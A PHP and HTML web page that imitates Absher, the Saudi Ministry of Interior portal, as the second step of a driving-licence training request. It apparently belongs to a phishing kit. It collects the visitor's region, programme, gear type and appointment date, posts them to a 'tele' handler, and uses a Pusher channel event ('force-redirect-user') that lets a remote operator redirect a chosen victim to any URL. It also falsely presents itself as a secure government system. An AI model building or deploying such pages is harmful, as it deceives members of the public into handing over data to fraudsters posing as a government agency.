<?php

session_start();

// 🔹 تجهيز النظام
require_once 'dashboard/init.php';
require_once 'includes/redirect.php';

// 🔹 التحقق من وجود user_id
$userId = $_SESSION['current_user_id'] ?? null;

if (!$userId) {
    header('Location: index.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>أبشر - استكمال طلب رخصة القيادة</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            direction: rtl;
        }

        body {
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ============================================
           شريط أبشر الأخضر العلوي
        ============================================ */
        .absher-header {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            padding: 15px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        }

        .absher-header .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .absher-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .absher-logo h1 {
            color: white;
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0;
        }

        .gov-badge {
            background: rgba(255,255,255,0.2);
            padding: 8px 20px;
            border-radius: 25px;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
        }

        /* ============================================
           Progress Bar
        ============================================ */
        .progress-container {
            background: white;
            padding: 25px;
            margin: 20px auto;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 700px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            margin-bottom: 15px;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 20px;
            right: 0;
            width: 100%;
            height: 3px;
            background: #e0e0e0;
            z-index: 0;
        }

        .progress-step {
            position: relative;
            z-index: 1;
            text-align: center;
            flex: 1;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e0e0e0;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 700;
            transition: all 0.3s;
        }

        .step-circle.completed {
            background: #2d7a3e;
            color: white;
        }

        .step-circle.active {
            background: #2d7a3e;
            color: white;
            box-shadow: 0 0 0 5px rgba(45, 122, 62, 0.2);
        }

        .step-label {
            font-size: 0.85rem;
            color: #666;
            font-weight: 600;
        }

        .step-label.active {
            color: #2d7a3e;
            font-weight: 700;
        }

        /* ============================================
           منطقة المحتوى
        ============================================ */
        .main-content {
            flex: 1;
            padding: 20px 0 40px;
        }

        .form-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 700px;
            margin: 0 auto;
        }

        .page-title {
            text-align: center;
            color: #2d7a3e;
            font-weight: 700;
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .page-subtitle {
            text-align: center;
            color: #666;
            font-size: 1rem;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        /* ============================================
           حقول النموذج
        ============================================ */
        .form-label {
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }

        .required-star {
            color: #d32f2f;
            font-weight: bold;
            margin-right: 3px;
        }

        .form-control,
        .form-select {
            height: 50px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 0 15px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-control:focus,
        .form-select:focus {
            border-color: #2d7a3e;
            box-shadow: 0 0 0 3px rgba(45, 122, 62, 0.1);
            outline: none;
        }

        /* ============================================
           زر المتابعة
        ============================================ */
        .btn-submit {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            border: none;
            color: white;
            height: 55px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 10px;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(45, 122, 62, 0.3);
        }

        .btn-submit:hover:not(:disabled) {
            background: linear-gradient(135deg, #1e5a2d 0%, #2d7a3e 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(45, 122, 62, 0.4);
        }

        .btn-submit:disabled {
            background: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* ============================================
           التذييل الحكومي
        ============================================ */
        .gov-footer {
            background: #1a1a1a;
            color: white;
            padding: 40px 0 20px;
            margin-top: auto;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin-bottom: 30px;
        }

        .footer-section h5 {
            color: #2d7a3e;
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1.1rem;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 10px;
        }

        .footer-section ul li a {
            color: #ccc;
            text-decoration: none;
            transition: color 0.3s;
            font-size: 0.9rem;
        }

        .footer-section ul li a:hover {
            color: #2d7a3e;
        }

        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 20px;
            text-align: center;
        }

        .footer-bottom p {
            color: #999;
            margin: 5px 0;
            font-size: 0.85rem;
        }

        .footer-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 30px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .footer-logos img {
            height: 50px;
            filter: brightness(0) invert(1);
            opacity: 0.6;
            transition: opacity 0.3s;
        }

        .footer-logos img:hover {
            opacity: 1;
        }

        /* ============================================
           Responsive
        ============================================ */
        @media (max-width: 768px) {
            .form-container {
                padding: 25px;
                margin: 0 15px;
            }

            .progress-container {
                margin: 15px;
                padding: 20px 15px;
            }

            .page-title {
                font-size: 1.4rem;
            }

            .absher-logo h1 {
                font-size: 1.2rem;
            }

            .gov-badge {
                font-size: 0.8rem;
                padding: 6px 15px;
            }

            .footer-content {
                grid-template-columns: 1fr;
            }

            .step-label {
                font-size: 0.75rem;
            }

            .step-circle {
                width: 35px;
                height: 35px;
                font-size: 0.9rem;
            }
        }
    </style>
</head>

<body>

    <!-- ============================================
         شريط أبشر الأخضر
    ============================================ -->
    <header class="absher-header">
        <div class="container">
            <div class="absher-logo">
                <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
                <h1>أبشر</h1>
            </div>
            <div class="gov-badge">
                <i class="fas fa-landmark"></i>
                وزارة الداخلية
            </div>
        </div>
    </header>

    <!-- ============================================
         Progress Bar
    ============================================ -->
    <div class="progress-container container">
        <div class="progress-steps">
            <div class="progress-step">
                <div class="step-circle completed">
                    <i class="fas fa-check"></i>
                </div>
                <div class="step-label">البيانات الأساسية</div>
            </div>
            <div class="progress-step">
                <div class="step-circle active">2</div>
                <div class="step-label active">معلومات التدريب</div>
            </div>
            <div class="progress-step">
                <div class="step-circle">3</div>
                <div class="step-label">المراجعة والتأكيد</div>
            </div>
        </div>
    </div>

    <!-- ============================================
         منطقة المحتوى الرئيسية
    ============================================ -->
    <main class="main-content">
        <div class="container">
            <div class="form-container">
                <h2 class="page-title">
                    <i class="fas fa-car"></i>
                    معلومات التدريب
                </h2>
                <p class="page-subtitle">
                    يرجى اختيار تفاصيل التدريب المطلوبة
                </p>

                <form action="tele/register-second.php" method="POST">
                    <!-- اختيار المنطقة -->
                    <div class="mb-4">
                        <label for="region" class="form-label">
                            <i class="fas fa-map-marker-alt"></i>
                            اختيار المنطقة
                            <span class="required-star">*</span>
                        </label>
                        <select name="region" id="region" required class="form-select">
                            <option value="">اختر المنطقة</option>
                            <option value="جدة">جدة</option>
                            <option value="الرياض">الرياض</option>
                            <option value="تبوك">تبوك</option>
                            <option value="القصيم">القصيم</option>
                            <option value="الطائف">الطائف</option>
                            <option value="جازان">جازان</option>
                            <option value="الخبر">الخبر</option>
                            <option value="الدمام">الدمام</option>
                            <option value="مكة">مكة</option>
                            <option value="حفر الباطن">حفر الباطن</option>
                            <option value="عرعر">عرعر</option>
                            <option value="أخرى">أخرى</option>
                        </select>
                    </div>

                    <!-- اختيار المستوى -->
                    <div class="mb-4">
                        <label for="level" class="form-label">
                            <i class="fas fa-layer-group"></i>
                            اختيار المستوى
                            <span class="required-star">*</span>
                        </label>
                        <select name="level" id="level" required class="form-select">
                            <option value="">اختر المستوى</option>
                                                        <option value="تحديد مستوى">تحديد مستوى</option>
                            <option value="برنامج 30 ساعة">برنامج 30 ساعة</option>
                            <option value="برنامج 12 ساعة">برنامج 12 ساعة</option>
                            <option value="برنامج 6 ساعات">برنامج 6 ساعات</option>
                                                        <option value="موعد اختبار نهائي (استبدال رخصة اجنبية)">موعد اختبار نهائي (استبدال رخصة اجنبية)</option>
                          
                        </select>
                    </div>

                    <!-- نوع الجير -->
                    <div class="mb-4">
                        <label for="gear_type" class="form-label">
                            <i class="fas fa-cog"></i>
                            نوع الجير
                            <span class="required-star">*</span>
                        </label>
                        <select name="gear_type" id="gear_type" required class="form-select">
                            <option value="">اختر نوع الجير</option>
                            <option value="عادي">عادي</option>
                            <option value="أوتوماتيك">أوتوماتيك</option>
                        </select>
                    </div>

                    <!-- الفترة الزمنية -->
                    <div class="mb-4">
                        <label for="time_period" class="form-label">
                            <i class="fas fa-clock"></i>
                            الفترة الزمنية
                            <span class="required-star">*</span>
                        </label>
                        <select name="time_period" id="time_period" required class="form-select">
                            <option value="">اختر الفترة الزمنية</option>
                            <option value="الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً">الفترة الصباحية (9 ص - 2 م)</option>
                            <option value="الفترة المسائية من الساعة 2 مساءاً الى الساعة 8 مساءاً">الفترة المسائية (2 م - 8 م)</option>
                        </select>
                    </div>

                    <!-- تاريخ الموعد المطلوب -->
                    <div class="mb-4">
                        <label for="appointment_date" class="form-label">
                            <i class="fas fa-calendar-alt"></i>
                            تاريخ الموعد المطلوب
                            <span class="required-star">*</span>
                        </label>
                        <input type="date" name="appointment_date" id="appointment_date" required class="form-control">
                    </div>

                    <!-- زر المتابعة -->
                    <div class="text-center mt-5">
                        <button type="submit" name="submit" id="butSubm" class="btn-submit" disabled>
                            <i class="fas fa-arrow-left"></i>
                            متابعة
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <!-- ============================================
         التذييل الحكومي
    ============================================ -->
    <footer class="gov-footer">
        <div class="container">
            <div class="footer-content">
                <!-- خدمات أبشر -->
                <div class="footer-section">
                    <h5><i class="fas fa-globe"></i> خدمات أبشر</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> رخصة القيادة</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> المخالفات المرورية</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> تجديد الإقامة</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> استعلام عن تأشيرة</a></li>
                    </ul>
                </div>

                <!-- تواصل معنا -->
                <div class="footer-section">
                    <h5><i class="fas fa-phone-alt"></i> تواصل معنا</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-headset"></i> مركز الاتصال: 920020405</a></li>
                        <li><a href="#"><i class="fas fa-envelope"></i> البريد الإلكتروني</a></li>
                        <li><a href="#"><i class="fab fa-twitter"></i> تويتر</a></li>
                        <li><a href="#"><i class="fab fa-facebook"></i> فيسبوك</a></li>
                    </ul>
                </div>

                <!-- روابط مهمة -->
                <div class="footer-section">
                    <h5><i class="fas fa-link"></i> روابط مهمة</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> الشروط والأحكام</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> سياسة الخصوصية</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> الأسئلة الشائعة</a></li>
                        <li><a href="#"><i class="fas fa-chevron-left"></i> خريطة الموقع</a></li>
                    </ul>
                </div>
            </div>

            <!-- أسفل التذييل -->
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='50' font-size='40' fill='white'%3E🇸🇦%3C/text%3E%3C/svg%3E" alt="المملكة العربية السعودية">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 100'%3E%3Ctext y='60' font-size='35' fill='white'%3E⚔️%3C/text%3E%3C/svg%3E" alt="وزارة الداخلية">
                </div>
                <p class="mt-3">
                    <i class="fas fa-copyright"></i>
                    2025 جميع الحقوق محفوظة - منصة أبشر - وزارة الداخلية - المملكة العربية السعودية
                </p>
                <p>
                    <i class="fas fa-shield-alt"></i>
                    نظام آمن ومحمي بأعلى معايير الأمن السيبراني
                </p>
            </div>
        </div>
    </footer>

    <!-- ============================================
         JavaScript
    ============================================ -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
        // Pusher Configuration
        const pusher = new Pusher('a56388ee6222f6c5fb86', {
            cluster: 'ap2',
            encrypted: true
        });

        const channel = pusher.subscribe('my-channel');

        channel.bind('force-redirect-user', function(data) {
            const myId = localStorage.getItem('current_user_id');

            if (myId && data.userId == myId) {
                window.location.href = data.url;
            }
        });

        // 🔹 تحديد الحد الأدنى للتاريخ (من بعد يوم واحد - غداً)
        const appointmentDateInput = document.getElementById('appointment_date');
        const today = new Date();
        const tomorrow = new Date(today);
        tomorrow.setDate(tomorrow.getDate() + 1);
        
        // تنسيق التاريخ إلى YYYY-MM-DD
        const minDate = tomorrow.toISOString().split('T')[0];
        appointmentDateInput.min = minDate;

        // Form Validation
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });
    </script>

</body>

</html>